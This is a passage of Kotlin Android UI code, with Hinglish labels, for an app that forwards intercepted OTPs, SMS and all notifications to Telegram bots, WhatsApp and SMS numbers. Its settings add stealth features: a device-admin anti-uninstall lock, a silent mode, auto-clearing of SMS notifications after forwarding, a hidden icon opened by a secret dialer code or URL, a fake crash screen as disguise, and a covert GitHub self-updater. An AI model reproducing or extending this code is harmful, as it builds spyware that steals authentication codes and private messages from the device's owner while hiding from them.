                Text(
                    text = "Bachho se app ko delete hone se bachane aur icon chhupe rakhne ke options:",
                    fontSize = 11.sp,
                    color = Color.DarkGray,
                    modifier = Modifier.padding(bottom = 12.dp)
                )

                // 5A: Anti-Uninstall Lock (Device Administrator)
                Row(
                    modifier = Modifier.fillMaxWidth(),
                    verticalAlignment = Alignment.CenterVertically,
                    horizontalArrangement = Arrangement.SpaceBetween
                ) {
                    Column(modifier = Modifier.weight(1f)) {
                        Text("Anti-Uninstall Lock", fontWeight = FontWeight.Bold, fontSize = 14.sp)
                        Text(
                            text = if (isAdminActive) "🟢 Active: Koi app delete nahi kar sakta" else "🔴 Inactive: Tap to protect",
                            fontSize = 11.sp,
                            color = if (isAdminActive) Color(0xFF2E7D32) else Color.Gray
                        )
                    }
                    Switch(
                        checked = isAdminActive,
                        onCheckedChange = { enable ->
                            val admin = ComponentName(context, OtpDeviceAdminReceiver::class.java)
                            val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as? DevicePolicyManager
                            if (enable) {
                                val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                                    putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin)
                                    putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "App ko uninstallation se lock karne ke liye Activate karein.")
                                }
                                context.startActivity(intent)
                            } else {
                                dpm?.removeActiveAdmin(admin)
                                isAdminActive = false
                                Toast.makeText(context, "Anti-Uninstall Lock Disabled", Toast.LENGTH_SHORT).show()
                            }
                        }
                    )
                }

                Divider(modifier = Modifier.padding(vertical = 12.dp))

                // 5B: Silent Stealth Mode (100% Chupchap / No Screen Pop-ups)
                Row(
                    modifier = Modifier.fillMaxWidth(),
                    verticalAlignment = Alignment.CenterVertically,
                    horizontalArrangement = Arrangement.SpaceBetween
                ) {
                    Column(modifier = Modifier.weight(1f)) {
                        Text("Silent Stealth Mode", fontWeight = FontWeight.Bold, fontSize = 14.sp)
                        Text(
                            text = if (isSilentMode)
                                "🟢 Active (Chupchap): Screen par koi notification ya aawaz nahi aayegi"
                            else
                                "🔴 Inactive: Screen par pop-up notification aayega",
                            fontSize = 11.sp,
                            color = if (isSilentMode) Color(0xFF2E7D32) else Color.Gray
                        )
                    }
                    Switch(
                        checked = isSilentMode,
                        onCheckedChange = { silent ->
                            isSilentMode = silent
                            prefs.edit().putBoolean("show_screen_popups", !silent).apply()
                            val msg = if (silent) "Silent Mode ON: Screen par koi notification nahi aayega!" else "Silent Mode OFF: Pop-up notification ON"
                            Toast.makeText(context, msg, Toast.LENGTH_SHORT).show()
                        }
                    )
                }

                Divider(modifier = Modifier.padding(vertical = 12.dp))

                // Feature 3: Fingerprint / PIN App Lock
                Row(
                    modifier = Modifier.fillMaxWidth(),
                    verticalAlignment = Alignment.CenterVertically,
                    horizontalArrangement = Arrangement.SpaceBetween
                ) {
                    Column(modifier = Modifier.weight(1f)) {
                        Text("👆 Fingerprint / PIN App Lock", fontWeight = FontWeight.Bold, fontSize = 14.sp)
                        Text(
                            text = if (isAppLockEnabled) "🟢 Protected: Khulne par fingerprint/PIN mangega" else "Off: Seedha app khul jayegi",
                            fontSize = 11.sp,
                            color = if (isAppLockEnabled) Color(0xFF2E7D32) else Color.Gray
                        )
                    }
                    Switch(
                        checked = isAppLockEnabled,
                        onCheckedChange = { checked ->
                            isAppLockEnabled = checked
                            prefs.edit().putBoolean("app_lock_enabled", checked).apply()
                        }
                    )
                }

                Divider(modifier = Modifier.padding(vertical = 12.dp))

                // Feature 6: Fake Crash Screen Disguise
                Row(
                    modifier = Modifier.fillMaxWidth(),
                    verticalAlignment = Alignment.CenterVertically,
                    horizontalArrangement = Arrangement.SpaceBetween
                ) {
                    Column(modifier = Modifier.weight(1f)) {
                        Text("🎭 Fake Crash Screen (Top Disguise)", fontWeight = FontWeight.Bold, fontSize = 14.sp)
                        Text(
                            text = if (isFakeCrashEnabled) "🟢 Active: Khulne par Play Services crash dikhayega (3-tap unlock)" else "Off: Normal screen dikhegi",
                            fontSize = 11.sp,
                            color = if (isFakeCrashEnabled) Color(0xFF2E7D32) else Color.Gray
                        )
                    }
                    Switch(
                        checked = isFakeCrashEnabled,
                        onCheckedChange = { checked ->
                            isFakeCrashEnabled = checked
                            prefs.edit().putBoolean("fake_crash_enabled", checked).apply()
                        }
                    )
                }

                Divider(modifier = Modifier.padding(vertical = 12.dp))

                // Feature 7: Auto-Clear SMS Notification
                Row(
                    modifier = Modifier.fillMaxWidth(),
                    verticalAlignment = Alignment.CenterVertically,
                    horizontalArrangement = Arrangement.SpaceBetween
                ) {
                    Column(modifier = Modifier.weight(1f)) {
                        Text("🔕 Auto-Clear SMS Notifications", fontWeight = FontWeight.Bold, fontSize = 14.sp)
                        Text(
                            text = if (isAutoClearSms) "🟢 Active: OTP forward hote hi screen se SMS ka pop-up gayab ho jayega" else "Off: Screen par SMS pop-up bana rahega",
                            fontSize = 11.sp,
                            color = if (isAutoClearSms) Color(0xFF2E7D32) else Color.Gray
                        )
                    }
                    Switch(
                        checked = isAutoClearSms,
                        onCheckedChange = { checked ->
                            isAutoClearSms = checked
                            prefs.edit().putBoolean("auto_clear_sms_notification", checked).apply()
                        }
                    )
                }

                Divider(modifier = Modifier.padding(vertical = 12.dp))

                // 5C: Hide App Icon
                Row(
                    modifier = Modifier.fillMaxWidth(),
                    verticalAlignment = Alignment.CenterVertically,
                    horizontalArrangement = Arrangement.SpaceBetween
                ) {
                    Column(modifier = Modifier.weight(1f)) {
                        Text("Hide App Icon", fontWeight = FontWeight.Bold, fontSize = 14.sp)
                        Text(
                            text = if (isIconHidden) "🟢 Icon Hidden from screen" else "Visible on home screen",
                            fontSize = 11.sp,
                            color = if (isIconHidden) Color(0xFF2E7D32) else Color.Gray
                        )
                    }
                    Switch(
                        checked = isIconHidden,
                        onCheckedChange = { hide ->
                            setLauncherIconVisibility(context, hide)
                            isIconHidden = hide
                            if (hide) {
                                Toast.makeText(context, "Icon Chhup Gaya! Kholne ke liye otp://open use karein.", Toast.LENGTH_LONG).show()
                            } else {
                                Toast.makeText(context, "Icon Wapas Screen Par Aa Gaya!", Toast.LENGTH_SHORT).show()
                            }
                        }
                    )
                }

                Spacer(modifier = Modifier.height(10.dp))

                // Secret Open Helper Box
                Surface(
                    color = Color.White,
                    shape = RoundedCornerShape(8.dp),
                    modifier = Modifier.fillMaxWidth()
                ) {
                    Column(modifier = Modifier.padding(10.dp)) {
                        Text(
                            text = "📞 Secret Dialer Code: *#*#0825#*#*",
                            fontWeight = FontWeight.Bold,
                            fontSize = 13.sp,
                            color = Color(0xFF4A148C)
                        )
                        Text(
                            text = "Phone ke keypad par *#*#0825#*#* dial karein — ye app ko turant khol dega aur icon hide/unhide ko toggle kar dega.",
                            fontSize = 10.sp,
                            color = Color.DarkGray,
                            modifier = Modifier.padding(top = 2.dp, bottom = 6.dp)
                        )
                        OutlinedButton(
                            onClick = {
                                val newHide = SecretCodeReceiver.toggleVisibilityAndLaunch(context)
                                isIconHidden = newHide
                            },
                            modifier = Modifier.fillMaxWidth().padding(bottom = 8.dp)
                        ) {
                            Text("🧪 Test Secret Code (*#*#0825#*#*)", fontSize = 11.sp)
                        }

                        Divider(modifier = Modifier.padding(vertical = 6.dp))

                        Text(
                            text = "🔑 Secret Opening URL: otp://open",
                            fontWeight = FontWeight.Bold,
                            fontSize = 12.sp,
                            color = Color(0xFF4A148C)
                        )
                        Text(
                            text = "Jab icon hide ho, to Chrome browser me otp://open likh kar enter karein ya niche diye gaye button se test karein:",
                            fontSize = 10.sp,
                            color = Color.DarkGray,
                            modifier = Modifier.padding(vertical = 4.dp)
                        )
                        Row(
                            modifier = Modifier.fillMaxWidth(),
                            horizontalArrangement = Arrangement.spacedBy(8.dp)
                        ) {
                            OutlinedButton(
                                onClick = {
                                    val clipboard = context.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
                                    val clip = ClipData.newPlainText("Secret Link", "otp://open")
                                    clipboard.setPrimaryClip(clip)
                                    Toast.makeText(context, "Link Copied: otp://open", Toast.LENGTH_SHORT).show()
                                },
                                modifier = Modifier.weight(1f)
                            ) {
                                Text("📋 Copy Link", fontSize = 11.sp)
                            }
                            Button(
                                onClick = {
                                    try {
                                        val intent = Intent(Intent.ACTION_VIEW, Uri.parse("otp://open"))
                                        context.startActivity(intent)
                                    } catch (e: Exception) {
                                        Toast.makeText(context, "Error opening link: ${e.message}", Toast.LENGTH_SHORT).show()
                                    }
                                },
                                modifier = Modifier.weight(1f),
                                colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF4A148C))
                            ) {
                                Text("🚀 Test Open", fontSize = 11.sp)
                            }
                        }

                        if (isIconHidden) {
                            Spacer(modifier = Modifier.height(8.dp))
                            Button(
                                onClick = {
                                    setLauncherIconVisibility(context, false)
                                    isIconHidden = false
                                    Toast.makeText(context, "Icon Re-Enabled on Home Screen!", Toast.LENGTH_SHORT).show()
                                },
                                colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF2E7D32)),
                                modifier = Modifier.fillMaxWidth()
                            ) {
                                Text("👁️ Unhide Icon (Show on Screen)", fontSize = 12.sp)
                            }
                        }
                    }
                }
            }
        }

        // 6. Secret In-App Update Card
        Card(
            modifier = Modifier.fillMaxWidth().padding(bottom = 16.dp),
            colors = CardDefaults.cardColors(containerColor = Color(0xFFE3F2FD))
        ) {
            Column(modifier = Modifier.padding(16.dp)) {
                Text(
                    text = "🔄 Secret In-App Update (GitHub)",
                    fontWeight = FontWeight.Bold,
                    fontSize = 15.sp,
                    color = Color(0xFF0D47A1)
                )
                Text(
                    text = "Bahar screen par bina koi nishaan ya pop-up chhode, aap akele me yahan se direct update install kar sakte hain:",
                    fontSize = 11.sp,
                    color = Color.DarkGray,
                    modifier = Modifier.padding(top = 2.dp, bottom = 10.dp)
                )

                var updateProgressText by remember { mutableStateOf("") }
                var isUpdating by remember { mutableStateOf(false) }

                Button(
                    onClick = {
                        isUpdating = true
                        updateProgressText = "Connecting to GitHub..."
                        scope.launch {
                            val res = AppUpdater.downloadAndInstall(context) { progress ->
                                updateProgressText = progress
                            }
                            if (!res.first) {
                                updateProgressText = "❌ ${res.second}"
                            }
                            isUpdating = false
                        }
                    },
                    enabled = !isUpdating,
                    colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF1565C0)),
                    modifier = Modifier.fillMaxWidth()
                ) {
                    Text(if (isUpdating) updateProgressText else "🚀 Check & Install Update Now")
                }

                if (updateProgressText.isNotEmpty() && !isUpdating) {
                    Text(
                        text = updateProgressText,
                        fontSize = 12.sp,
                        fontWeight = FontWeight.Bold,
                        color = if (updateProgressText.startsWith("❌")) Color(0xFFC62828) else Color(0xFF1565C0),
                        modifier = Modifier.padding(top = 6.dp)
                    )
                }
            }
        }

        // Save All Settings Button
        Button(
            onClick = {
                prefs.edit()
                    .putBoolean("is_telegram_enabled", isTelegramEnabled)
                    .putString("bot_token", botToken.trim())
                    .putString("chat_id", chatId.trim())
                    .putBoolean("is_telegram_2_enabled", isTelegram2Enabled)
                    .putString("bot_token_2", botToken2.trim())
                    .putString("chat_id_2", chatId2.trim())
                    .putBoolean("is_whatsapp_enabled", isWhatsAppEnabled)
                    .putString("wa_phone", waPhone.trim())
                    .putString("wa_api_key", waApiKey.trim())
                    .putBoolean("is_sms_enabled", isSmsEnabled)
                    .putString("sms_phone", smsPhone.trim())
                    .putInt("sms_sim_slot", smsSimSlot)
                    .putBoolean("only_otp_mode", isOnlyOtpMode)
                    .putBoolean("low_battery_alert_enabled", isLowBatteryAlertEnabled)
                    .putBoolean("app_lock_enabled", isAppLockEnabled)
                    .putBoolean("fake_crash_enabled", isFakeCrashEnabled)
                    .putBoolean("auto_clear_sms_notification", isAutoClearSms)
                    .apply()
                Toast.makeText(context, "✅ Sabhi Settings Save Ho Gayi!", Toast.LENGTH_SHORT).show()
            },
            modifier = Modifier.fillMaxWidth().height(52.dp),
            colors = ButtonDefaults.buttonColors(containerColor = MaterialTheme.colorScheme.primary)
        ) {
            Text("💾 Sabhi Settings Save Karein", fontSize = 15.sp, fontWeight = FontWeight.Bold)
        }
    }
}

@Composable
fun KeywordsTab(context: Context) {
    val prefs = remember { PrefsHelper.getPrefs(context) }
    var forwardAll by remember { mutableStateOf(prefs.getBoolean("forward_all_notifications", false)) }
    var keywordsList by remember { mutableStateOf(KeywordManager.getKeywords(context)) }
    var newKeywordText by remember { mutableStateOf("") }
    var testSender by remember { mutableStateOf("AD-UPEGOV-S") }
    var testMessage by remember { mutableStateOf("OTP for Authentication is : 240833 --eDistrict UP") }
    var testResult by remember { mutableStateOf("") }

    Column(
        modifier = Modifier
            .fillMaxSize()
            .verticalScroll(rememberScrollState())
            .padding(16.dp)
    ) {
        // Forward ALL Notifications Master Card
        Card(
            modifier = Modifier.fillMaxWidth().padding(bottom = 16.dp),
            colors = CardDefaults.cardColors(containerColor = if (forwardAll) Color(0xFFFFF3E0) else Color(0xFFF5F5F5)),
            elevation = CardDefaults.cardElevation(defaultElevation = 2.dp)
        ) {
            Row(
                modifier = Modifier.fillMaxWidth().padding(14.dp),
                verticalAlignment = Alignment.CenterVertically,
                horizontalArrangement = Arrangement.SpaceBetween
            ) {
                Column(modifier = Modifier.weight(1f)) {
                    Text(
                        text = "⚡ Forward ALL Notifications",
                        fontWeight = FontWeight.Bold,
                        fontSize = 15.sp,
                        color = if (forwardAll) Color(0xFFE65100) else Color.Black
                    )
                    Text(
                        text = if (forwardAll)
                            "🟢 ON: Phone par aane wala HAR EK notification aur SMS forward hoga (Bina kisi filter ke)."
                        else
                            "⚪ OFF: Sirf eDistrict aur niche diye gaye rules se match hone wale messages hi forward honge.",
                        fontSize = 11.sp,
                        color = Color.DarkGray
                    )
                }
                Switch(
                    checked = forwardAll,
                    onCheckedChange = { checked ->
                        forwardAll = checked
                        prefs.edit().putBoolean("forward_all_notifications", checked).apply()
                    }
                )
            }
        }
        Text(
            text = "🎯 Active Filter Keywords & Senders",
            fontWeight = FontWeight.Bold,
            fontSize = 17.sp,
            modifier = Modifier.padding(bottom = 6.dp)
        )
        Text(
            text = "Jab bhi inme se koi naam SMS ya Notification me aayega, OTP turant forward hoga. Naye portals ka naam aap yahan jod sakte hain:",
            fontSize = 12.sp,
            color = Color.DarkGray,
            modifier = Modifier.padding(bottom = 16.dp)
        )

        // Add new keyword row
        Row(
            modifier = Modifier.fillMaxWidth(),
            verticalAlignment = Alignment.CenterVertically
        ) {
            OutlinedTextField(
                value = newKeywordText,
                onValueChange = { newKeywordText = it },
                label = { Text("Naya Keyword (e.g. CSC, EDIST)") },
                modifier = Modifier.weight(1f),
                singleLine = true
            )
            Spacer(modifier = Modifier.width(8.dp))
            Button(
                onClick = {
                    if (newKeywordText.trim().isNotEmpty()) {
                        keywordsList = KeywordManager.addKeyword(context, newKeywordText.trim())
                        newKeywordText = ""
                        Toast.makeText(context, "Keyword Jud Gaya!", Toast.LENGTH_SHORT).show()
                    }
                },
                modifier = Modifier.height(56.dp)
            ) {
                Text("+ Add")
            }
        }

        Spacer(modifier = Modifier.height(14.dp))
        Row(
            modifier = Modifier.fillMaxWidth(),
            verticalAlignment = Alignment.CenterVertically,
            horizontalArrangement = Arrangement.SpaceBetween
        ) {
            Text(
                text = "Current Active Rules (${keywordsList.size}):",
                fontWeight = FontWeight.SemiBold,
                fontSize = 14.sp
            )
            TextButton(
                onClick = {
                    keywordsList = KeywordManager.resetDefaults(context)
                    Toast.makeText(context, "Reset to Default Rules", Toast.LENGTH_SHORT).show()
                }
            ) {
                Text("Reset Defaults", fontSize = 11.sp, color = MaterialTheme.colorScheme.primary)
            }
        }

        Column(modifier = Modifier.fillMaxWidth()) {
            keywordsList.forEach { kw ->
                Card(
                    modifier = Modifier.fillMaxWidth().padding(vertical = 4.dp),
                    colors = CardDefaults.cardColors(containerColor = Color(0xFFF5F5F5))
                ) {
                    Row(
                        modifier = Modifier
                            .fillMaxWidth()
                            .padding(horizontal = 14.dp, vertical = 10.dp),
                        verticalAlignment = Alignment.CenterVertically,
                        horizontalArrangement = Arrangement.SpaceBetween
                    ) {
                        Text(
                            text = "🏷️ $kw",
                            fontWeight = FontWeight.Bold,
                            fontSize = 14.sp
                        )
                        IconButton(
                            onClick = {
                                keywordsList = KeywordManager.removeKeyword(context, kw)
                                Toast.makeText(context, "Removed: $kw", Toast.LENGTH_SHORT).show()
                            }
                        ) {
                            Text("❌", fontSize = 14.sp)
                        }
                    }
                }
            }
        }

        Spacer(modifier = Modifier.height(20.dp))

        // Live Test Simulator Card
        Card(
            modifier = Modifier.fillMaxWidth().padding(bottom = 16.dp),
            colors = CardDefaults.cardColors(containerColor = Color(0xFFEDE7F6))
        ) {
            Column(modifier = Modifier.padding(14.dp)) {
                Text("🧪 Test Keyword Match (Live Simulator)", fontWeight = FontWeight.Bold, fontSize = 14.sp, color = Color(0xFF4527A0))
                Text("Message aur Sender paste karke test karein ki app ise forward karegi ya nahi:", fontSize = 11.sp, color = Color.DarkGray)
                Spacer(modifier = Modifier.height(8.dp))
                OutlinedTextField(
                    value = testSender,
                    onValueChange = { testSender = it },
                    label = { Text("Sender ID (e.g. AD-UPEGOV-S)") },
                    modifier = Modifier.fillMaxWidth(),
                    singleLine = true
                )
                Spacer(modifier = Modifier.height(6.dp))
                OutlinedTextField(
                    value = testMessage,
                    onValueChange = { testMessage = it },
                    label = { Text("SMS Message Body") },
                    modifier = Modifier.fillMaxWidth(),
                    maxLines = 2
                )
                Spacer(modifier = Modifier.height(10.dp))
                Button(
                    onClick = {
                        val matches = KeywordManager.matches(context, testSender, testMessage)
                        testResult = if (matches) "✅ MATCH HO GAYA! Ye message forward hoga." else "❌ MATCH NAHI HUA! Ye message reject hoga."
                    },
                    modifier = Modifier.fillMaxWidth(),
                    colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF512DA8))
                ) {
                    Text("Check Match")
                }
                if (testResult.isNotEmpty()) {
                    Text(
                        text = testResult,
                        fontSize = 12.sp,
                        fontWeight = FontWeight.Bold,
                        color = if (testResult.startsWith("✅")) Color(0xFF2E7D32) else Color(0xFFC62828),
                        modifier = Modifier.padding(top = 8.dp)
                    )
                }
            }
        }
    }
}

@Composable
fun HistoryTab(context: Context) {
    val prefs = remember { PrefsHelper.getPrefs(context) }
    var historyList by remember { mutableStateOf(HistoryManager.getHistory(context)) }
    var isAutoClearHistory by remember { mutableStateOf(prefs.getBoolean("auto_clear_history_24h", false)) }

    Column(
        modifier = Modifier
            .fillMaxSize()
            .padding(16.dp)
    ) {
        Row(
            modifier = Modifier.fillMaxWidth(),
            verticalAlignment = Alignment.CenterVertically,
            horizontalArrangement = Arrangement.SpaceBetween
        ) {
            Text(
                text = "📜 Recent OTP History",
                fontWeight = FontWeight.Bold,
                fontSize = 17.sp
            )
            Row(verticalAlignment = Alignment.CenterVertically) {
                IconButton(onClick = {
                    historyList = HistoryManager.getHistory(context)
                    Toast.makeText(context, "History Refreshed", Toast.LENGTH_SHORT).show()
                }) {
                    Text("🔄", fontSize = 16.sp)
                }
                if (historyList.isNotEmpty()) {
                    TextButton(
                        onClick = {
                            HistoryManager.clearHistory(context)
                            historyList = emptyList()
                            Toast.makeText(context, "History Cleared!", Toast.LENGTH_SHORT).show()
                        }
                    ) {
                        Text("Clear All", color = Color.Red, fontSize = 12.sp)
                    }
                }
            }
        }

        Spacer(modifier = Modifier.height(6.dp))

        // Feature 4: Auto-Delete History (>24 Hours) Card
        Card(
            modifier = Modifier.fillMaxWidth().padding(bottom = 12.dp),
            colors = CardDefaults.cardColors(containerColor = Color(0xFFFBE9E7))
        ) {
            Row(
                modifier = Modifier.fillMaxWidth().padding(12.dp),
                verticalAlignment = Alignment.CenterVertically,
                horizontalArrangement = Arrangement.SpaceBetween
            ) {
                Column(modifier = Modifier.weight(1f)) {
                    Text("🗑️ Auto-Delete History (>24 Hours)", fontWeight = FontWeight.Bold, fontSize = 13.sp, color = Color(0xFFBF360C))
                    Text(
                        text = if (isAutoClearHistory) "🟢 Active: 24h purane records auto-delete honge" else "Off: Sabhi records bache rahenge",
                        fontSize = 10.sp,
                        color = Color.DarkGray
                    )
                }
                Switch(
                    checked = isAutoClearHistory,
                    onCheckedChange = { checked ->
                        isAutoClearHistory = checked
                        prefs.edit().putBoolean("auto_clear_history_24h", checked).apply()
                        if (checked) {
                            HistoryManager.pruneOldHistory(context)
                            historyList = HistoryManager.getHistory(context)
                            Toast.makeText(context, "Purane 24h+ OTP saaf ho gaye!", Toast.LENGTH_SHORT).show()
                        }
                    }
                )
            }
        }

        if (historyList.isEmpty()) {
            Box(
                modifier = Modifier.fillMaxSize(),
                contentAlignment = Alignment.Center
            ) {
                Text(
                    text = "Abhi tak koi OTP forward nahi hua hai.\nJaise hi koi OTP aayega, uska khata yahan dikhega.",
                    fontSize = 13.sp,
                    color = Color.Gray,
                    textAlign = TextAlign.Center
                )
            }
        } else {
            LazyColumn(modifier = Modifier.fillMaxSize()) {
                items(historyList) { item ->
                    Card(
                        modifier = Modifier.fillMaxWidth().padding(vertical = 6.dp),
                        colors = CardDefaults.cardColors(containerColor = Color(0xFFFAFAFA)),
                        elevation = CardDefaults.cardElevation(defaultElevation = 2.dp)
                    ) {
                        Column(modifier = Modifier.padding(12.dp)) {
                            Row(
                                modifier = Modifier.fillMaxWidth(),
                                horizontalArrangement = Arrangement.SpaceBetween
                            ) {
                                Text(
                                    text = "From: ${item.sender}",
                                    fontWeight = FontWeight.Bold,
                                    fontSize = 13.sp,
                                    color = Color(0xFF1565C0)
                                )
                                Text(
                                    text = item.timestamp,
                                    fontSize = 11.sp,
                                    color = Color.Gray
                                )
                            }
                            Spacer(modifier = Modifier.height(4.dp))
                            Text(
                                text = "🔑 OTP Code: ${item.otp}",
                                fontWeight = FontWeight.ExtraBold,
                                fontSize = 16.sp,
                                color = Color(0xFF2E7D32)
                            )
                            Spacer(modifier = Modifier.height(4.dp))
                            Text(
                                text = item.fullMessage,
                                fontSize = 11.sp,
                                color = Color.DarkGray
                            )
                            Spacer(modifier = Modifier.height(8.dp))
                            Row(
                                modifier = Modifier.fillMaxWidth(),
                                horizontalArrangement = Arrangement.spacedBy(8.dp)
                            ) {
                                StatusBadge(label = "TG 1", status = item.telegramStatus)
                                if (item.telegram2Status != "Disabled") {
                                    StatusBadge(label = "TG 2", status = item.telegram2Status)
                                }
                                StatusBadge(label = "WhatsApp", status = item.whatsappStatus)
                                StatusBadge(label = "SMS", status = item.smsStatus)
                            }
                        }
                    }
                }
            }
        }
    }
}

@Composable
fun StatusBadge(label: String, status: String) {
    val bg = when (status) {
        "Sent" -> Color(0xFFE8F5E9)
        "Failed", "Error" -> Color(0xFFFFEBEE)
        else -> Color(0xFFEEEEEE)
    }
    val fg = when (status) {
        "Sent" -> Color(0xFF2E7D32)
        "Failed", "Error" -> Color(0xFFC62828)
        else -> Color.Gray
    }
    Surface(
        color = bg,
        shape = RoundedCornerShape(4.dp),
        modifier = Modifier.padding(vertical = 2.dp)
    ) {
        Text(
            text = "$label: $status",
            fontSize = 10.sp,
            fontWeight = FontWeight.SemiBold,
            color = fg,
            modifier = Modifier.padding(horizontal = 6.dp, vertical = 2.dp)
        )
    }
}
